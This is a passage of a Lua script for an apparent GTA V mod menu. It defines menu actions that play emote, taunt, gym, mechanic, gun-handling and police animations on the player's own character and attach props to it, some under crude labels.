menu.action(emotes_root, "Gang Sign C", {""}, "", function(on_click)
    play_anim("mp_player_int_uppergang_sign_b", "mp_player_int_gang_sign_b", -1)
end)

menu.action(emotes_root, "Go Away", {""}, "", function(on_click)
    play_animplayonce("mini@hookers_sp", "idle_reject", -1)
end)

menu.action(emotes_root, "Greeting", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@podium@no_prop@", "regal_c_1st", -1)
end)

menu.action(emotes_root, "Handcuffed", {""}, "", function(on_click)
    play_anim("anim@move_m@prisoner_cuffed_rc", "aim_low_loop", -1)
end)

menu.action(emotes_root, "Hands Up", {""}, "", function(on_click)
    play_anim("mp_missheist_countrybank@lift_hands", "lift_hands_in_air_loop", -1)
end)

menu.action(emotes_root, "Hands Up Kneeled", {""}, "", function(on_click)
    play_animstationary("random@arrests", "kneeling_arrest_idle", -1)
end)

menu.action(emotes_root, "Hell Nah", {""}, "", function(on_click)
    play_animplayonce("mini@triathlon", "u_cant_do_that", -1)
end)

menu.action(emotes_root, "Hitch Lift", {""}, "", function(on_click)
    play_animstationary("random@hitch_lift", "idle_f", -1)
end)

menu.action(emotes_root, "It's Me", {""}, "", function(on_click)
    play_animplayonce("mini@triathlon", "wot_the_fuck", -1)
end)

menu.action(emotes_root, "Jumping Hyped", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@flat@solo@no_props@", "jump_a_player_a", -1)
end)

menu.action(emotes_root, "Knuckle Crunch", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@knuckle_crunch", "knuckle_crunch", -1)
end)

menu.action(emotes_root, "Mime A", {""}, "", function(on_click)
    play_animplayonce("special_ped@mime@monologue_8@monologue_8a", "08_ig_1_wall_ba_0", -1)
end)

menu.action(emotes_root, "Mime B", {""}, "", function(on_click)
    play_animplayonce("special_ped@mime@monologue_7@monologue_7a", "11_ig_1_run_aw_0", -1)
end)

menu.action(emotes_root, "Mind Blown", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@mind_blown", "mind_blown", -1)
end)

menu.action(emotes_root, "Mind Reading", {""}, "", function(on_click)
    play_animplayonce("switch@trevor@under_pier", "exit_trevor", -1)
end)

menu.action(emotes_root, "Namaste", {""}, "", function(on_click)
    play_animstationary("timetable@amanda@ig_4", "ig_4_base", -1)
end)

menu.action(emotes_root, "No Way", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@no_way", "no_way", -1)
end)

menu.action(emotes_root, "Not Scared", {""}, "", function(on_click)
    play_anim("anim@mp_player_intselfiejazz_hands", "idle_a", -1)
end)

menu.action(emotes_root, "Okay", {""}, "", function(on_click)
    play_anim("anim@mp_player_intselfiedock", "idle_a", -1)
end)

menu.action(emotes_root, "Out of Breath", {""}, "", function(on_click)
    play_anim("rcmfanatic1out_of_breath", "p_zero_tired_01", -1)
end)

menu.action(emotes_root, "Pacing Nervously", {""}, "", function(on_click)
    play_animstationary("anim@scripted@island@special_peds@dave@hs4_dave_ig2", "base_idle", -1)
end)

menu.action(emotes_root, "Peek a Boo", {""}, "", function(on_click)
    play_animstationary("random@paparazzi@peek", "left_peek_a", -1)
end)

menu.action(emotes_root, "Petting", {""}, "", function(on_click)
    play_animplayonce("creatures@rottweiler@tricks@", "petting_franklin", -1)
end)

menu.action(emotes_root, "Race Starter", {""}, "", function(on_click)
    play_animplayonce("random@street_race", "grid_girl_race_start", -1)
end)

menu.action(emotes_root, "Raining Cash", {""}, "", function(on_click)
    request_model_load(2846904189)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 100.0, 2846904189, 60309, false, false)
    play_animplayonce("anim@mp_player_intcelebrationfemale@raining_cash", "raining_cash", -1)
end)

menu.action(emotes_root, "Respect", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@respect", "respect", -1)
end)

menu.action(emotes_root, "Rock It", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@rock", "rock", -1)
end)

menu.action(emotes_root, "Rock n Roll", {""}, "", function(on_click)
    play_animplayonce("amb@code_human_in_car_mp_actions@rock@std@ps@base", "idle_a", -1)
end)

menu.action(emotes_root, "Scared", {""}, "", function(on_click)
    play_animstationary("anim@heists@prison_heistunfinished_biz@popov_react", "popov_cower", -1)
end)

menu.action(emotes_root, "Serenity", {""}, "", function(on_click)
    play_animstationary("anim@scripted@short_trip@fixf_trip3_ig1_celeb_idle@", "idle_jimmy", -1)
end)

menu.action(emotes_root, "Slap So Hard", {""}, "", function(on_click)
    play_animplayonce("melee@unarmed@streamed_variations", "plyr_takedown_front_slap", -1)
end)

menu.action(emotes_root, "Slow Clap", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@slow_clap", "slow_clap", -1)
end)

menu.action(emotes_root, "Sob", {""}, "", function(on_click)
    play_animstationary("switch@trevor@floyd_crying", "console_end_loop_floyd", -1)
end)

menu.action(emotes_root, "Soldier Salute", {""}, "", function(on_click)
    play_anim("anim@mp_player_intincarsalutestd@ds@", "idle_a", -1)
end)

menu.action(emotes_root, "Superman", {""}, "", function(on_click)
    play_animstationary("skydive@parachute@", "chute_back", -1)
end)

menu.action(emotes_root, "T-Pose", {""}, "", function(on_click)
    play_anim("mph_nar_fin_ext-32", "mp_m_freemode_01_dual-32", -1)
end)

menu.action(emotes_root, "Tao Dance", {""}, "", function(on_click)
    play_animplayonce("misschinese2_crystalmazemcs1_ig", "dance_loop_tao", -1)
end)

menu.action(emotes_root, "Tazed", {""}, "", function(on_click)
    play_animstationary("stungun@standing", "damage", -1)
end)

menu.action(emotes_root, "Think Harder", {""}, "", function(on_click)
    play_animplayonce("gestures@miss@fra_0", "lamar_fkn0_cjae_01_g4", -1)
end)

menu.action(emotes_root, "Wave Around", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@flat@solo@no_props@", "wave_a_player_b", -1)
end)

menu.action(emotes_root, "Whistle", {""}, "", function(on_click)
    play_animplayonce("rcmnigel1c", "hailing_whistle_waive_a", -1)
end)

menu.action(emotes_root, "Yo-Yo", {""}, "hold something from weapon wheel first, eg. ball", function(on_click)
    play_anim("weapon@w_sp_jerrycan", "discard", -1)
end)

menu.action(emotes_root, "You Crazy", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@you_loco", "you_loco", -1)
end)

menu.action(emotes_root, "You Had One Job", {""}, "", function(on_click)
    play_animplayonce("special_ped@jane@monologue_5@monologue_5c", "brotheradrianhasshown_2", -1)
end)

----- TAUNTS -----

menu.action(taunts_vroot, "Angry Clap", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@flat@solo@no_props@", "angry_clap_b_player_a", -1)
end)

menu.action(taunts_vroot, "Annoying Bird", {""}, "", function(on_click)
    play_animplayonce("rcm_barry2", "clown_idle_1", -1)
end)

menu.action(taunts_vroot, "Bring It On", {""}, "", function(on_click)
    play_animplayonce("misscommon@response", "bring_it_on", -1)
end)

menu.action(taunts_vroot, "Certified Wanker", {""}, "", function(on_click)
    play_anim("anim@mp_player_intselfiewank", "idle_a", -1)
end)

menu.action(taunts_vroot, "Chicken Taunt", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@chicken_taunt", "chicken_taunt", -1)
end)

menu.action(taunts_vroot, "Clown", {""}, "", function(on_click)
    play_animplayonce("rcm_barry2", "clown_idle_3", -1)
end)

menu.action(taunts_vroot, "Cocky Gunslinger", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@dirty_harry_bang", "dirty_harry_bang", -1)
end)

menu.action(taunts_vroot, "Come At Me", {""}, "", function(on_click)
    play_animplayonce("melee@unarmed@streamed_taunts", "taunt_01", -1)
end)

menu.action(taunts_vroot, "Cry Baby", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@cry_baby", "cry_baby", -1)
end)

menu.action(taunts_vroot, "Cut Throat", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@cut_throat", "cut_throat", -1)
end)

menu.action(taunts_vroot, "Cynical Laugh", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@flat@solo@no_props@", "taunt_e_player_b", -1)
end)

menu.action(taunts_vroot, "Drunken Monkey", {""}, "", function(on_click)
    play_animplayonce("rcm_barry2", "clown_idle_0", -1)
end)

menu.action(taunts_vroot, "Face Palm", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@face_palm", "face_palm", -1)
end)

menu.action(taunts_vroot, "Finger Fuck", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@dock", "dock", -1)
end)

menu.action(taunts_vroot, "Fuck Y'all", {""}, "", function(on_click)
    play_anim("mp_player_int_upperfinger", "mp_player_int_finger_02", -1)
end)

menu.action(taunts_vroot, "Giggle", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@flat@solo@no_props@", "giggle_a_player_b", -1)
end)

menu.action(taunts_vroot, "Goofy Monkey", {""}, "", function(on_click)
    play_animplayonce("rcm_barry2", "clown_idle_6", -1)
end)

menu.action(taunts_vroot, "Middle Finger", {""}, "", function(on_click)
    play_anim("anim@mp_player_intselfiethe_bird", "idle_a", -1)
end)

menu.action(taunts_vroot, "Nose Pick", {""}, "", function(on_click)
    play_anim("anim@mp_player_intcelebrationfemale@nose_pick", "nose_pick", -1)
end)

menu.action(taunts_vroot, "Oh Snap", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@oh_snap", "oh_snap", -1)
end)

menu.action(taunts_vroot, "Piggyback", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_a", -1)
end)

menu.action(taunts_vroot, "Ready To Fight", {""}, "", function(on_click)
    play_animplayonce("switch@franklin@gang_taunt_p3", "gang_taunt_with_lamar_loop_g2", -1)
end)

menu.action(taunts_vroot, "Screw You", {""}, "", function(on_click)
    play_animplayonce("misscommon@response", "screw_you", -1)
end)

menu.action(taunts_vroot, "Shrug", {""}, "", function(on_click)
    play_animplayonce("anim@mp_celebration@draw@male", "draw_react_male_a", -1)
end)

menu.action(taunts_vroot, "Shush", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@shush", "shush", -1)
end)

menu.action(taunts_vroot, "Smug", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@flat@solo@no_props@", "smug_a_player_b", -1)
end)

menu.action(taunts_vroot, "Stinky Ass", {""}, "", function(on_click)
    play_animplayonce("rcm_barry2", "clown_idle_2", -1)
end)

menu.action(taunts_vroot, "Thumb On Ears", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@thumb_on_ears", "thumb_on_ears", -1)
end)

menu.action(taunts_vroot, "Thumbs Down", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@flat@solo@no_props@", "thumbs_down_a_player_a", -1)
end)

menu.action(taunts_vroot, "You Stink", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@stinker", "stinker", -1)
end)

menu.action(taunts_vroot, "Wanker", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationmale@wank", "wank", -1)
end)

----- GYM ANIMATIONS -----

menu.action(gymanims_vroot, "Back Flip", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@flat@solo@no_props@", "flip_a_player_a", -1)
end)

menu.action(gymanims_vroot, "Barbell Curl", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_MUSCLE_FREE_WEIGHTS", 0, true)
end)

menu.action(gymanims_vroot, "Bench Press", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "PROP_HUMAN_SEAT_MUSCLE_BENCH_PRESS_PRISON", 0, true)
end)

menu.action(gymanims_vroot, "Chin Up", {""}, "", function(on_click)
    play_animstationary("amb@prop_human_muscle_chin_ups@male@base", "base", -1)
end)

menu.action(gymanims_vroot, "Dive Landing", {""}, "", function(on_click)
    play_animstopatlastframe("move_climb", "clamberpose_to_dive_angled_20", -1)
end)

menu.action(gymanims_vroot, "Dive Left", {""}, "", function(on_click)
    play_animstopatlastframe("mini@tennis", "dive_bh_long_hi", -1)
end)

menu.action(gymanims_vroot, "Dive Right", {""}, "", function(on_click)
    play_animstopatlastframe("mini@tennis", "dive_fh_long_hi", -1)
end)

menu.action(gymanims_vroot, "Flex Arms", {""}, "", function(on_click)
    play_animplayonce("amb@world_human_muscle_flex@arms_at_side@idle_a", "idle_a", -1)
end)

menu.action(gymanims_vroot, "Flex Pose", {""}, "", function(on_click)
    play_animplayonce("amb@world_human_muscle_flex@arms_in_front@idle_a", "idle_b", -1)
end)

menu.action(gymanims_vroot, "Hanging Crunches", {""}, "", function(on_click)
    play_animstationary("missmic2@meat_hook", "michael_meat_hook_react_a", -1)
end)

menu.action(gymanims_vroot, "Jumping Jacks", {""}, "", function(on_click)
    play_animstationary("timetable@reunited@ig_2", "jimmy_getknocked", -1)
end)

menu.action(gymanims_vroot, "Karate Chops A", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@karate_chops", "karate_chops", -1)
end)

menu.action(gymanims_vroot, "Karate Chops B", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@karate_chops", "karate_chops", -1)
end)

menu.action(gymanims_vroot, "Kick Flip", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@flat@solo@no_props@", "cap_a_player_a", -1)
end)

menu.action(gymanims_vroot, "Long Jump", {""}, "", function(on_click)
    play_animstopatlastframe("anim@sports@ballgame@handball@", "ball_rstop_l", -1)
end)

menu.action(gymanims_vroot, "Plank", {""}, "", function(on_click)
    play_animstationary("amb@world_human_push_ups@male@idle_a", "idle_a", -1)
end)

menu.action(gymanims_vroot, "Push Up", {""}, "", function(on_click)
    play_animstationary("switch@franklin@press_ups", "pressups_loop", -1)
end)

menu.action(gymanims_vroot, "Rubble Slide", {""}, "", function(on_click)
    play_animplayonce("missheistfbi3b_ig6_v2", "rubble_slide_alt_gunman", -1)
end)

menu.action(gymanims_vroot, "Shadow Boxing A", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@shadow_boxing", "shadow_boxing", -1)
end)

menu.action(gymanims_vroot, "Shadow Boxing B", {""}, "", function(on_click)
    play_anim("rcmextreme2", "loop_punching", -1)
end)

menu.action(gymanims_vroot, "Sit Up", {""}, "", function(on_click)
    play_animstationary("amb@world_human_sit_ups@male@base", "base", -1)
end)

menu.action(gymanims_vroot, "Stationary Jog", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_JOG_STANDING", 0, true)
end)

menu.action(gymanims_vroot, "Stretch Arms", {""}, "", function(on_click)
    play_animplayonce("missexile2", "franklinwavetohelicopter", -1)
end)

menu.action(gymanims_vroot, "Stretch Body A", {""}, "", function(on_click)
    play_animplayonce("mini@triathlon", "ig_2_gen_warmup_01", -1)
end)

menu.action(gymanims_vroot, "Stretch Body B", {""}, "", function(on_click)
    play_animplayonce("mini@triathlon", "idle_a", -1)
end)

menu.action(gymanims_vroot, "Stretch Legs", {""}, "", function(on_click)
    play_animplayonce("mini@triathlon", "idle_f", -1)
end)

menu.action(gymanims_vroot, "Upright Barbell Row", {""}, "", function(on_click)
    request_model_load(-1314904318)
    attachto(0.0, 0.0, 0.02, players.user(), 0.0, 0.0, 0.0, -1314904318, 28422, false, false)
    play_animstationary("amb@world_human_muscle_free_weights@male@barbell@idle_a", "idle_d", -1)
end)

menu.action(gymanims_vroot, "Yoga A", {""}, "", function(on_click)
    play_animstationary("timetable@amanda@ig_4", "ig_4_idle", -1)
end)

menu.action(gymanims_vroot, "Yoga B", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_YOGA", 0, true)
end)

menu.action(gymanims_vroot, "Yoga C", {""}, "", function(on_click)
    play_animstationary("amb@world_human_yoga@female@base", "base_a", -1)
end)

menu.action(gymanims_vroot, "Yoga D", {""}, "", function(on_click)
    play_animstationary("amb@world_human_yoga@female@base", "base_b", -1)
end)

menu.action(gymanims_vroot, "Yoga E", {""}, "", function(on_click)
    play_animstationary("amb@world_human_yoga@female@base", "base_c", -1)
end)

menu.action(gymanims_vroot, "Warm Up A", {""}, "", function(on_click)
    play_animplayonce("anim@deathmatch_intros@unarmed", "intro_male_unarmed_e", -1)
end)

menu.action(gymanims_vroot, "Warm Up B", {""}, "", function(on_click)
    play_animplayonce("anim@deathmatch_intros@unarmed", "intro_male_unarmed_d", -1)
end)

----- MECHANIC/TUNER ANIMATIONS -----

menu.action(tuneranims_vroot, "Carry Toolbox", {""}, "", function(on_click)
    request_model_load(-1972842851)
    attachto(0.38, -0.05, 0.0, players.user(), -90.0, -30.0, 80.0, -1972842851, 6286, false, false)
    play_anim("weapons@first_person@aim_rng@generic@misc@briefcase@", "aim_high_loop", -1)
end)

menu.action(tuneranims_vroot, "Cleaning Car", {""}, "", function(on_click)
    request_model_load(-678752633)
    attachto(0.0, 0.0, -0.01, players.user(), 90.0, 0.0, 0.0, -678752633, 28422, false, false)
    play_animstationary("switch@franklin@cleaning_car", "001946_01_gc_fras_v2_ig_5_base", -1)
end)

menu.action(tuneranims_vroot, "Cleaning Car Kneeled", {""}, "", function(on_click)
    request_model_load(3379669263)
    attachto(0.0, -0.01, 0.06, players.user(), 170.0, 80.0, 100.0, 3379669263, 28422, false, false)
    play_animstationary("switch@franklin@lamar_tagging_wall", "lamar_tagging_exit_loop_lamar", -1)
end)

menu.action(tuneranims_vroot, "Crouched Repairs", {""}, "", function(on_click)
    play_animstationary("anim@amb@clubhouse@tutorial@bkr_tut_ig3@", "machinic_loop_mechandplayer", -1)
end)

menu.action(tuneranims_vroot, "Crouched Repairs 2", {""}, "", function(on_click)
    play_animstationary("move_crouch_proto", "idle", -1)
	play_anim("missmechanic", "work2_base", -1)
	request_model_load(1054209047)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 1054209047, 60309, false, false)
end)

menu.action(tuneranims_vroot, "Engine Maintenance", {""}, "", function(on_click)
    play_animstationary("mini@repair", "fixing_a_ped", -1)
end)

menu.action(tuneranims_vroot, "Engine Maintenance 2", {""}, "", function(on_click)
    play_animstationary("mini@repair", "fixing_a_player", -1)
end)

menu.action(tuneranims_vroot, "Engine Maintenance 3", {""}, "", function(on_click)
    play_animstationary("misscarsteal2fixer", "confused_a", -1)
end)

menu.action(tuneranims_vroot, "Engine Maintenance 4", {""}, "", function(on_click)
    play_animstationary("mp_intro_seq@", "mp_mech_fix", -1)
end)

menu.action(tuneranims_vroot, "Hammering", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_HAMMERING", 0, true)
end)

menu.action(tuneranims_vroot, "Inspect Components", {""}, "", function(on_click)
    play_animstationary("anim@amb@carmeet@checkout_car@male_d@idles", "idle_c", -1)
end)

menu.action(tuneranims_vroot, "Inspect Components 2", {""}, "", function(on_click)
    play_animstationary("anim@amb@carmeet@listen_music@male_b@idles", "idle_d", -1)
end)

menu.action(tuneranims_vroot, "Inspect Components 3", {""}, "", function(on_click)
    play_animstationary("anim@amb@board_room@diagram_blueprints@", "base_amy_skater_01", -1)
end)

menu.action(tuneranims_vroot, "Inspect Components 4", {""}, "", function(on_click)
    play_animstationary("rcmnigel1b", "idle_gardener", -1)
end)

menu.action(tuneranims_vroot, "Refueling Nozzle", {""}, "", function(on_click)
	play_animfreeze("weapons@melee_1h", "run", -1)
	request_model_load(2357330433)
    attachto(0.045, 0.045, 0.024, players.user(), -7.0, -61.0, -99.0, 2357330433, 6286, false, false)
end)

menu.action(tuneranims_vroot, "Refueling Jerry Can", {""}, "", function(on_click)
	play_animstationary("weapon@w_sp_jerrycan", "fire", -1)
	request_model_load(242383520)
    attachto(0.28, 0.01, 0.0, players.user(), -90.0, -10.0, 89.0, 242383520, 28422, false, false)
end)

menu.action(tuneranims_vroot, "Seated Repairs", {""}, "", function(on_click)
    play_animstationary("anim@amb@range@load_clips@", "idle_01_amy_skater_01", -1)
end)

menu.action(tuneranims_vroot, "Tighten Bolts", {""}, "", function(on_click)
    play_anim("low_int-0", "ig_benny_dual-0", -1)
	play_animstationary("misstrevor1", "ortega_outro_loop_ort", -1)
	request_model_load(3384084947)
    attachto(0.20, 0.082, -0.067, players.user(), 10.0, 60.0, -150.0, 3384084947, 28422, false, false)
end)

menu.action(tuneranims_vroot, "Tighten Bolts 2", {""}, "", function(on_click)
	play_animstationary("missmechanic", "work2_base", -1)
	request_model_load(1054209047)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 1054209047, 60309, false, false)
end)

menu.action(tuneranims_vroot, "Tyre Maintenance", {""}, "", function(on_click)
	play_animstationary("anim@heists@narcotics@funding@gang_idle", "gang_chatting_idle01", -1)
end)

menu.action(tuneranims_vroot, "Welding", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_WELDING", 0, true)
end)

menu.action(tuneranims_vroot, "Wiring Maintenance", {""}, "", function(on_click)
    play_anim("mp_common_heist", "use_terminal_loop", -1)
	play_animstationary("move_crouch_proto", "idle", -1)
end)

menu.action(tuneranims_vroot, "Wiring Maintenance 2", {""}, "", function(on_click)
    play_anim("anim@gangops@facility@servers@", "hotwire", -1)
	play_animstationary("move_crouch_proto", "idle", -1)
end)

menu.action(tuneranims_vroot, "Work Under The Car", {""}, "", function(on_click)
    play_animstationary("amb@world_human_vehicle_mechanic@male@base", "base", -1)
end)

----- TACTICAL/GUN ANIMATIONS -----

menu.action(gunanims_vroot, "Back Spin Holster", {""}, "", function(on_click)
    play_animnoloop("anim@weapons@pistol@doubleaction_holster", "holster", -1)
end)

menu.action(gunanims_vroot, "Hand On Holster", {""}, "", function(on_click)
    play_anim("move_m@intimidation@cop@unarmed", "idle", -1)
end)

menu.action(gunanims_vroot, "Hip Fire", {""}, "", function(on_click)
    play_anim("weapons@pistol_1h@hillbilly", "aim_med_loop", -1)
end)

menu.action(gunanims_vroot, "Kneeling Pistol Aim", {""}, "", function(on_click)
    play_animstationary("move_aim_strafe_crouch_2h", "idle", -1)
end)

menu.action(gunanims_vroot, "Kneeling Rifle Aim", {""}, "", function(on_click)
    play_animstationary("missfbi2", "franklin_sniper_crouch", -1)
end)

menu.action(gunanims_vroot, "Kneeling Rifle Low Carry", {""}, "", function(on_click)
    play_animfreeze("missheistdocks2a@crouch", "crouching_idle_a", -1)
end)

menu.action(gunanims_vroot, "One Handed Rifle Carry", {""}, "", function(on_click)
    play_anim("mph_nar_fin_ext-13", "player_two_dual-13", -1)
end)

menu.action(gunanims_vroot, "One Handed Pistol Aim", {""}, "", function(on_click)
    play_anim("weapons@pistol_1h@gang", "aim_med_loop", -1)
end)

menu.action(gunanims_vroot, "Pistol High Guard", {""}, "", function(on_click)
    play_anim("move_weapon@pistol@cope", "idle", -1)
end)

menu.action(gunanims_vroot, "Pistol High Ready", {""}, "", function(on_click)
    play_anim("move_weapon@pistol@copc", "idle", -1)
end)

menu.action(gunanims_vroot, "Pistol Low Ready", {""}, "", function(on_click)
    play_anim("move_weapon@pistol@copa", "idle", -1)
end)

menu.action(gunanims_vroot, "Practice Shots", {""}, "", function(on_click)
    play_animstationary("misschinese2_bank5", "peds_shootcans_a", -1)
end)

menu.action(gunanims_vroot, "Prone Rifle Aim", {""}, "", function(on_click)
    play_animstationary("missfbi3_sniping", "prone_michael", -1)
end)

menu.action(gunanims_vroot, "Rifle High Carry", {""}, "", function(on_click)
    play_anim("weapons@first_person@aim_idle@generic@submachine_gun@shared@core", "wall_block", -1)
end)

menu.action(gunanims_vroot, "Rifle Low Carry", {""}, "", function(on_click)
    play_anim("weapons@heavy@rpg", "idle", -1)
end)

----- COP ANIMATIONS -----

menu.action(copanims_vroot, "Call For Backup", {""}, "", function(on_click)
    play_anim("arrest", "radio_chatter", -1)
end)

menu.action(copanims_vroot, "Crowd Control", {""}, "", function(on_click)
    play_animplayonce("amb@code_human_police_crowd_control@idle_a", "idle_a", -1)
end)

menu.action(copanims_vroot, "Flashlight", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_SECURITY_SHINE_TORCH", 0, true)
end)

menu.action(copanims_vroot, "Hand Radio Chatter", {""}, "", function(on_click)
    request_model_load(2330564864)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 2330564864, 28422, false, false)
    play_anim("cellphone@in_car@ps", "cellphone_text_read_base", -1)
end)

menu.action(copanims_vroot, "Hands On Belt A", {""}, "", function(on_click)
    play_anim("amb@world_human_cop_idles@male@base", "base", -1)
end)

menu.action(copanims_vroot, "Hands On Belt B", {""}, "", function(on_click)
    play_anim("amb@world_human_cop_idles@female@base", "base", -1)
end)

menu.action(copanims_vroot, "Issue Ticket", {""}, "", function(on_click)
    request_model_load(-334989242)
    attachto(0.1, 0.02, 0.05, players.user(), 10.0, 0.0, 0.0, -334989242, 18905, false, false)
    request_model_load(-294844349)
    attachto(0.13, 0.05, -0.01, players.user(), -100.0, 0.0, 20, -294844349, 57005, false, false)
    play_anim("missheistdockssetup1clipboard@base", "base", -1)
end)

menu.action(copanims_vroot, "Megaphone", {""}, "", function(on_click)
    request_model_load(-1585551192)
    attachto(0.10, 0.03, -0.01, players.user(), 0.0, 120.0, 60.0, -1585551192, 18905, false, false)
    play_anim("anim@random@shop_clothes@watches", "base", -1)
end)

menu.action(copanims_vroot, "Paper Work", {""}, "", function(on_click)
    request_model_load(2107151586)
    attachto(0.1, 0.02, 0.06, players.user(), 10.0, 0.0, 0.0, 2107151586, 18905, false, false)
    request_model_load(-294844349)
    attachto(0.13, 0.05, -0.01, players.user(), -100.0, 0.0, 20, -294844349, 57005, false, false)
    play_anim("missheistdockssetup1clipboard@base", "base", -1)
end)

menu.action(copanims_vroot, "Shoulder Radio Chatter", {""}, "use outfit Top 2 - 35 for the police belt with radio", function(on_click)
    play_anim("random@arrests", "generic_radio_chatter", -1)
end)

menu.action(copanims_vroot, "Show Badge/ID", {""}, "", function(on_click)
	play_anim("anim@scripted@freemode@postertag@graffiti_spray@male@", "shake_can_idle_male", -1)
	request_model_load(1409747695)
    attachto(0.018, -0.02, 0.123, players.user(), -22.0, 14.0, 2.0, 1409747695, 28422, false, false)
end)

menu.action(copanims_vroot, "Traffic Wand", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_CAR_PARK_ATTENDANT", 0, true)
end)

--- PHOTOS ---

menu.action(copanims_pics_vroot, "Maxim Rashkovsky", {""}, "", function(on_click)
    request_model_load(630003835)
    attachto(0.0, -0.01, 0.0, players.user(), 0.0, 0.0, 0.0, 630003835, 28422, false, false)
    play_anim("mp_character_creation@customise@male_a", "loop", -1)
end)

menu.action(copanims_pics_vroot, "Unknown Male A", {""}, "", function(on_click)
    request_model_load(1052085257)
    attachto(0.137, 0.11, -0.03, players.user(), 0.0, 100.0, 80.0, 1052085257, 57005, false, false)
    play_anim("anim@weapons@first_person@aim_idle@generic@melee@switchblade@shared@core", "aim_med_loop", -1)
end)

menu.action(copanims_pics_vroot, "Unknown Male B", {""}, "", function(on_click)
    request_model_load(618574817)
    attachto(0.137, 0.11, -0.03, players.user(), 0.0, 100.0, 80.0, 618574817, 57005, false, false)
    play_anim("anim@weapons@first_person@aim_idle@generic@melee@switchblade@shared@core", "aim_med_loop", -1)
end)

menu.action(copanims_pics_vroot, "Unknown Male C", {""}, "", function(on_click)
    request_model_load(1316165619)
    attachto(0.137, 0.11, -0.03, players.user(), 0.0, 100.0, 80.0, 1316165619, 57005, false, false)
    play_anim("anim@weapons@first_person@aim_idle@generic@melee@switchblade@shared@core", "aim_med_loop", -1)
end)

menu.action(copanims_pics_vroot, "Unknown Male D", {""}, "", function(on_click)
    request_model_load(4142872755)
    attachto(0.137, 0.11, -0.03, players.user(), 0.0, 100.0, 80.0, 4142872755, 57005, false, false)
    play_anim("anim@weapons@first_person@aim_idle@generic@melee@switchblade@shared@core", "aim_med_loop", -1)
end)

menu.action(copanims_pics_vroot, "Unknown Male E", {""}, "", function(on_click)
    request_model_load(1098873624)
    attachto(0.137, 0.11, -0.03, players.user(), 0.0, 100.0, 80.0, 1098873624, 57005, false, false)
    play_anim("anim@weapons@first_person@aim_idle@generic@melee@switchblade@shared@core", "aim_med_loop", -1)
end)

menu.action(copanims_pics_vroot, "Unknown Male F", {""}, "", function(on_click)
    request_model_load(3931292123)
    attachto(0.137, 0.11, -0.03, players.user(), 0.0, 100.0, 80.0, 3931292123, 57005, false, false)
    play_anim("anim@weapons@first_person@aim_idle@generic@melee@switchblade@shared@core", "aim_med_loop", -1)
end)

menu.action(copanims_pics_vroot, "Unknown Male G", {""}, "", function(on_click)
    request_model_load(4087100388)
    attachto(0.0, -0.01, 0.0, players.user(), 0.0, 0.0, 0.0, 4087100388, 28422, false, false)
    play_anim("mp_character_creation@customise@male_a", "loop", -1)
end)

menu.action(copanims_pics_vroot, "Unknown Male H", {""}, "", function(on_click)
    request_model_load(16805345)
    attachto(0.0, -0.01, 0.0, players.user(), 0.0, 0.0, 0.0, 16805345, 28422, false, false)
    play_anim("mp_character_creation@customise@male_a", "loop", -1)
